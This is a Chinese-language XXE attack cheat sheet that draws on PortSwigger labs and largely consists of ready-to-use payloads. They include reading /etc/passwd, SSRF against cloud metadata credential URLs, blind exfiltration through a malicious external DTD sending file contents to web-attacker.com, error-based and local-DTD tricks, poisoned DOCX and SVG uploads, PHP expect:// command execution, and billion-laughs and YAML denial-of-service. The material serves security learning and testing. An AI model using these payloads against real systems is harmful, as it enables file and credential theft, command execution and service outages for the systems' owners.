<p>XML external entities provide the primary means by which <a href="https://portswigger.net/web-security/xxe">XML external entity attacks</a> arise.</p>
<h3 id="什么是-XML-参数实体"><a href="#什么是-XML-参数实体" class="headerlink" title="什么是 XML 参数实体?"></a>什么是 XML 参数实体?</h3><p>有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些强化，使用常规实体的 XXE 攻击会被阻止。在这种情况下，您可以改用 XML 参数实体。 XML 参数实体是一种特殊的 XML 实体，只能在 DTD 的其他地方引用。就目前而言，您只需要知道两件事。首先，XML 参数实体的声明包括实体名称前的百分号字符：</p>
<p><code>&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</code></p>
<p>其次，使用百分比字符而不是通常的 &amp; 符号来引用参数实体：<code>%myparameterentity;</code></p>
<p>这意味着您可以通过 XML 参数实体使用带外检测来测试盲 XXE，如下所示：</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;</code></p>
<p>这个 XXE 有效负载声明了一个名为“xxe”的 XML 参数实体，然后使用 DTD 中的实体。这将导致对攻击者域的 DNS 查找和 HTTP 请求，验证攻击是否成功。</p>
<h2 id="主要攻击"><a href="#主要攻击" class="headerlink" title="主要攻击"></a>主要攻击</h2><p><a href="https://portswigger.net/web-security/xxe">Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe</a></p>
<h3 id="实体测试"><a href="#实体测试" class="headerlink" title="实体测试"></a>实体测试</h3><p>在这次攻击中，我将测试一个简单的实体声明是否有效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY toreplace &quot;3&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">    &lt;productId&gt;&amp;toreplace;&lt;/productId&gt;</span><br><span class="line">    &lt;storeId&gt;1&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(220).png"></p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>让我们尝试以不同的方式读取 <code>/etc/passwd</code>。对于 Windows，您可以尝试阅读：<code>C:\windows\system32\drivers\etc\hosts</code></p>
<p>在第一种情况下，请注意 SYSTEM “<em>**file:&#x2F;&#x2F;&#x2F;**etc&#x2F;passwd</em>“ 也可以工作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &quot;/etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;example;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(221).png"></p>
<p>如果 Web 服务器正在使用 PHP，则第二种情况对于提取文件应该很有用（Portswiggers 实验室的情况除外）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;example;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>在这第三种情况下，我们将 <code>Element stockCheck</code> 声明为 ANY</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT stockCheck ANY&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;</span><br><span class="line">    &lt;productId&gt;&amp;file;&lt;/productId&gt;</span><br><span class="line">    &lt;storeId&gt;1&lt;/storeId&gt;</span><br><span class="line">&lt;/stockCheck3&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(222).png"></p>
<h3 id="目录内容罗列"><a href="#目录内容罗列" class="headerlink" title="目录内容罗列"></a>目录内容罗列</h3><p>在基于 <strong>java</strong>的应用程序中，可能可以通过 XXE <strong>列出目录的内容</strong>，其有效负载如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- /etc/ --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/&quot; &gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>XXE 可用于云服务器的 SSRF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Blind-SSRF"><a href="#Blind-SSRF" class="headerlink" title="Blind SSRF"></a>Blind SSRF</h3><p>使用<strong>上面的技术</strong>，您可以使服务器访问您控制的服务器以显示其易受攻击。但是，如果这不起作用，可能是因为 <strong>XML 实体不允许</strong>，在这种情况下，您可以尝试使用 <strong>XML 参数实体</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net&quot;&gt; %xxe; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<h3 id="“Blind”-SSRF-带外泄露数据"><a href="#“Blind”-SSRF-带外泄露数据" class="headerlink" title="“Blind” SSRF - 带外泄露数据"></a>“Blind” SSRF - 带外泄露数据</h3><p><strong>在这种情况下，我们将让服务器加载一个带有恶意负载的新 DTD，该负载将通过 HTTP 请求发送文件的内容（对于多行文件，您可以尝试通过</strong><em><strong>ftp:&#x2F;&#x2F;</strong></em><strong>协议泄露数据)。此解释取自</strong><a href="https://portswigger.net/web-security/xxe/blind"><strong>Portswiggers lab here</strong></a> <strong>。</strong></p>
<p>一个恶意 DTD 泄露 <code>/etc/hostname</code> 文件内容的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>

<p>This DTD carries out the following steps:</p>
<ul>
<li>定义一个名为 <code>file</code> 的 XML 参数实体，包含 <code>/etc/passwd</code> 文件的内容。</li>
<li>定义一个名为“eval”的 XML 参数实体，其中包含另一个名为“exfiltrate”的 XML 参数实体的动态声明。 <code>exfiltrate</code> 实体将通过向攻击者的 Web 服务器发出 HTTP 请求来评估，该请求包含 URL 查询字符串中的 <code>file</code> 实体的值。</li>
<li>使用 <code>eval</code> 实体，这会导致执行 <code>exfiltrate</code> 实体的动态声明。</li>
<li>使用 <code>exfiltrate</code> 实体，以便通过请求指定的 URL 来评估其值。</li>
</ul>
<p>然后，攻击者必须将恶意 DTD 托管在他们控制的系统上，通常是将其加载到他们自己的网络服务器上。例如，攻击者可能会在以下 URL 提供恶意 DTD：<br><code>http://web-attacker.com/malicious.dtd</code></p>
<p>最后，攻击者必须向易受攻击的应用程序提交以下 XXE 有效负载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XXE 有效负载声明了一个名为“xxe”的 XML 参数实体，然后使用 DTD 中的实体。这将导致 XML 解析器从攻击者的服务器获取外部 DTD 并内联解释它。然后执行恶意 DTD 中定义的步骤，并将 <code>/etc/passwd</code> 文件传输到攻击者的服务器。</p>
<h3 id="基于错误-XXE-攻击-外部-DTD"><a href="#基于错误-XXE-攻击-外部-DTD" class="headerlink" title="基于错误 XXE 攻击(外部 DTD)"></a>基于错误 XXE 攻击(外部 DTD)</h3><p><strong>在这种情况下，我们将让服务器加载一个恶意 DTD，该 DTD 将在错误消息中显示文件的内容（这仅在您可以看到错误消息时才有效）。</strong> <a href="https://portswigger.net/web-security/xxe/blind"><strong>Example from here.</strong></a></p>
<p>您可以使用恶意外部 DTD 触发包含 <code>/etc/passwd</code> 文件内容的 XML 解析错误消息，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>

<p>此 DTD 执行以下步骤：</p>
<ul>
<li>定义一个名为 <code>file</code> 的 XML 参数实体，包含 <code>/etc/passwd</code> 文件的内容。</li>
<li>定义一个名为 <code>eval</code> 的 XML 参数实体，其中包含另一个名为 <code>error</code> 的 XML 参数实体的动态声明。 <code>error</code> 实体将加载一个不存在的文件，该文件的名称包含 <code>file</code> 实体的值。</li>
<li>使用 <code>eval</code> 实体，这会导致执行 <code>error</code> 实体的动态声明。</li>
<li>使用 <code>error</code> 实体，尝试加载不存在的文件，从而导致错误消息包含不存在文件的名称，即 <code>/etc/passwd</code> 文件的内容。</li>
</ul>
<p>调用外部 DTD 错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p>您应该会在 Web 服务器响应的错误消息中看到文件的内容。<br><img src="/../.gitbook/assets/image%20(223).png"></p>
<p><em><strong>上述技术适用于外部 DTD，但通常不适用于在DOCTYPE元素中完全指定的内部 DTD。这是因为该技术涉及<code>在一个参数实体的定义中使用 XML 参数实体</code>。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中是不允许的。（一些解析器可能会兼容这种错误，但许多解析器不会。）</strong></em></p>
<h3 id="基于错误的-XXE-攻击-系统内置-DTD"><a href="#基于错误的-XXE-攻击-系统内置-DTD" class="headerlink" title="基于错误的 XXE 攻击 (系统内置 DTD)"></a><strong>基于错误的 XXE 攻击 (系统内置 DTD)</strong></h3><p>当 <strong>out-of-band interactions are blocked</strong>（即无法外联的情况），但 blind XXE 存在的情况应该如何处置？ <a href="https://portswigger.net/web-security/xxe/blind">相关资料</a>。</p>
<p>在这种情况下，由于 XML 语言规范中的漏洞，仍然可能<strong>触发包含敏感数据的错误消息</strong>。如果文档的<strong>DTD 混合使用内部和外部DTD</strong>声明，则<strong>内部DTD 可以重新定义在外部DTD</strong>中声明的实体。发生这种情况时，对<code>在一个参数实体的定义中使用 XML 参数实体</code>的限制就会放宽。</p>
<p>这意味着攻击者可以在内部 DTD 中使用<strong>基于错误的 XXE 技术</strong>，前提是他们使用的 XML 参数实体是<strong>重新定义在外部 DTD 中声明的实体</strong>。当然，如果带外连接被阻止，则无法从远程位置加载外部 DTD。相反，它需要是一个<strong>应用程序服务器本地的外部 DTD 文件</strong>。 <em>从本质上讲，攻击涉及调用恰好存在于本地文件系统上的 DTD 文件，并重新利用它来重新定义现有实体，从而触发包含敏感数据的解析错误。</em></p>
<p>例如，假设在服务器文件系统的“&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd”位置有一个 DTD 文件，该 DTD 文件定义了一个名为“custom_entity”的实体。攻击者可以通过提交如下所示的混合 DTD 来触发包含 <code>/etc/passwd</code> 文件内容的 XML 解析错误消息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>此 DTD 执行以下步骤：</p>
<ul>
<li>定义一个名为 <code>local_dtd</code> 的 XML 参数实体，包含存在于服务器文件系统上的外部 DTD 文件的内容。</li>
<li>重新定义名为“custom_entity”的 XML 参数实体，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含 <a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">基于错误的 XXE 漏洞利用</a>已经描述过，用于触发包含 <code>/etc/passwd</code> 文件内容的错误消息。</li>
<li>使用 <code>local_dtd</code> 实体，以便解释外部 DTD，包括 <code>custom_entity</code> 实体的重新定义值。这会产生所需的错误消息。</li>
</ul>
<p><strong>真实示例：</strong> 使用 GNOME 桌面环境的系统通常在 <code>/usr/share/yelp/dtd/docbookx.dtd</code> 有一个 DTD，其中包含一个名为 <code>ISOamso</code> 的实体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;3;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../.gitbook/assets/image%20(224).png"></p>
<p>由于此技术使用<strong>内部 DTD，因此您需要先找到一个有效的 DTD</strong>。您可以这样做<strong>安装</strong>服务器正在使用的相同<strong>OS&#x2F;软件</strong>并<strong>搜索一些默认DTD</strong>，或<strong>获取系统内</strong>默认DTD<strong>的列表</strong>和<strong>检查</strong>是否存在：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="定位系统内置的-DTD-文件"><a href="#定位系统内置的-DTD-文件" class="headerlink" title="定位系统内置的 DTD 文件"></a>定位系统内置的 DTD 文件</h3><p>可在以下 github 存储库中，您可以找到<strong>系统中可能存在的 DTD 路径</strong>：</p>
<p>url&#x3D;”<a href="https://github.com/GoSecure/dtd-finder/tree/master/list&quot;">https://github.com/GoSecure/dtd-finder/tree/master/list&quot;</a></p>
<p>如果拥有与目标系统同一个 Docker 镜像文件，可以尝试使用下面的工具在该镜像内找到内置的 DTD 文件：<a href="https://github.com/GoSecure/dtd-finder">Readme of the github</a> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar</span><br><span class="line"></span><br><span class="line">Scanning TAR file /tmp/dadocker.tar</span><br><span class="line"></span><br><span class="line"> [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd</span><br><span class="line">Testing 0 entities : []</span><br><span class="line"></span><br><span class="line"> [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd</span><br><span class="line">Testing 0 entities : []</span><br></pre></td></tr></table></figure>

<h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后它们会从中解析出一些细节。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>解析至少一个 XML 文件</strong>。<br>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。首先，创建一个空目录来解压你的文档，然后解压！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
<p>剩下的就是<strong>压缩文件以创建邪恶的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
<p>现在将文件上传到您的（希望如此）易受攻击的 Web 应用程序，并在 Burp Collaborator 日志中向黑客之神祈祷。</p>
<h3 id="Jar-protocol"><a href="#Jar-protocol" class="headerlink" title="Jar: protocol"></a>Jar: protocol</h3><p><code>jar</code> 协议仅适用于 <strong>Java 应用程序</strong>。它允许访问 <strong>PKZIP</strong>文件（<code>.zip</code>、<code>.jar</code>、…）中的文件，并适用于本地和远程文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar:file:///var/myarchive.zip!/file.txt</span><br><span class="line">jar:https://download.host.com/myarchive.zip!/file.txt</span><br></pre></td></tr></table></figure>

<p>hint style&#x3D;”danger”<br>能够访问 PKZIP 文件中的文件对于通过系统 DTD 文件滥用 XXE 非常有用。**检查 [此部分以了解如何滥用系统 DTD 文件](xxe-xee-xml-external-entity.md#基于错误的系统-dtd）。<br>endhint </p>
<h4 id="Behind-the-scenes"><a href="#Behind-the-scenes" class="headerlink" title="Behind the scenes"></a>Behind the scenes</h4><ol>
<li>它发出 HTTP 请求以加载 zip 存档。 <code>https://download.host.com/myarchive.zip</code></li>
<li>它将 HTTP 响应保存到一个临时位置。 <code>/tmp/...</code></li>
<li>它提取档案。</li>
<li>它读取<code>file.zip</code></li>
<li>它删除临时文件。</li>
</ol>
<p>请注意，可以在第二步中停止流程。诀窍是在提供文件时永远不要关闭连接。 <a href="https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution">这个工具很有用</a>：一个在python<code>slow_http_server.py</code>和一个在java<code>slowserver。罐子</code>。</p>
<p>一旦服务器下载了你的文件，你需要通过浏览临时目录来找到它的位置。由于是随机的，因此无法提前预测文件路径。<br><img src="https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png" alt="Jar"></p>
<p>hint style&#x3D;”danger”<br>在临时目录中写入文件有助于<strong>升级另一个涉及路径遍历的漏洞</strong>（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。<br>endhint </p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(1)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><h4 id="Billion-Laugh-Attack"><a href="#Billion-Laugh-Attack" class="headerlink" title="Billion Laugh Attack"></a>Billion Laugh Attack</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Yaml-Attack"><a href="#Yaml-Attack" class="headerlink" title="Yaml Attack"></a>Yaml Attack</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a: &amp;a [&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;]</span><br><span class="line">b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]</span><br><span class="line">c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]</span><br><span class="line">d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]</span><br><span class="line">e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]</span><br><span class="line">f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]</span><br><span class="line">g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]</span><br><span class="line">h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]</span><br><span class="line">i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]</span><br></pre></td></tr></table></figure>

<h4 id="二次爆炸攻击"><a href="#二次爆炸攻击" class="headerlink" title="二次爆炸攻击"></a>二次爆炸攻击</h4><p><img src="/../.gitbook/assets/image%20(531).png"></p>
<h2 id="Hidden-XXE-Surfaces"><a href="#Hidden-XXE-Surfaces" class="headerlink" title="Hidden XXE Surfaces"></a>Hidden XXE Surfaces</h2><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><p><a href="https://portswigger.net/web-security/xxe">From here.</a></p>
<p>一些应用程序<strong>接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析文档</strong>。当客户端提交的数据被放入一个<strong>后端 SOAP 请求</strong>，然后由后端 SOAP 服务处理时，就会出现这种情况。<br>在这种情况下，您无法执行经典的 XXE 攻击，因为<strong>您无法控制整个 XML</strong>文档，因此无法定义或修改 <code>DOCTYPE</code> 元素。但是，您也许可以使用 <code>XInclude</code> 代替。 <code>XInclude</code> 是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以在 XML 文档中的任何数据值中放置“XInclude”攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。<br>要执行 <code>XInclude</code> 攻击，您需要引用 <code>XInclude</code> 命名空间并提供您希望包含的文件的路径。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">productId=&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1</span><br></pre></td></tr></table></figure>

<h3 id="SVG-File-Upload"><a href="#SVG-File-Upload" class="headerlink" title="SVG - File Upload"></a>SVG - File Upload</h3><p><a href="https://portswigger.net/web-security/xxe">From here.</a></p>
<p>一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例有 DOCX 等办公文档格式和 SVG 等图像格式。<br>例如，应用程序可能允许用户<strong>上传图像</strong>，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收像 PNG 或 JPEG 这样的格式，<strong>正在使用的图像处理库也可能支持 SVG 图像</strong>。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>You could also try to <strong>execute commands</strong> using the PHP “expect” wrapper:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;</span><br><span class="line">    &lt;image xlink:href=&quot;expect://ls&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意读取文件或执行结果的第一行将出现在创建的图像内。因此，您需要能够访问 SVG 创建的图像。</strong></p>
